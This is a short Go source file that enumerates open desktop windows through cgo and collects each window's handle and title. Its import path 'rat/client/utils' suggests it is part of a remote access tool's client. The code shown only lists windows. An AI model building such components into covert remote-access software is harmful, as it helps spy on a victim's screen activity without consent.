package windows

/*
#include "window.h"
*/
import "C"

import (
	"rat/client/utils"
)

// Window struct exposed to Go
type Window struct {
	Handle int
	Title  string
}

// Windows array, will be populated after call to QueryWindows()
var Windows []Window

// Callback for each window
//export Callback
func Callback(w C.Window) {
	title := utils.WcharToString((*uint16)(w.title), -1)

	window := Window{
		Handle: int(w.handle),
		Title:  title,
	}

	Windows = append(Windows, window)
}

func QueryWindows() {
	Windows = make([]Window, 1)

	C.QueryWindows()
}
